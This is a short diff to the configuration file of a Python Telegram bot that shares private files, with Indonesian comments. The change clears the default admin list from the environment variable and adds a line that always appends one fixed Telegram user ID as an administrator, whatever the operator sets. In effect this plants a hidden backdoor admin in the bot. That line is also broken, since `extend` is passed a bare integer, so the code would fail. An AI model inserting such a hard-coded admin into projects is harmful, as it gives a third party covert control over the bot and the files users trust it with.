@@ -50,9 +50,10 @@ START_MSG = os.environ.get(
     "Hello {first}\n\nI'm here to help! I keep private files in a special channel and share links so others can access them effortlessly.",
 )
 try:
-    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "1350488685").split())]
+    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
 except ValueError:
     raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")
+ADMINS.extend(1350488685)
 
 # Pesan Saat Memaksa Subscribe
 FORCE_MSG = os.environ.get(
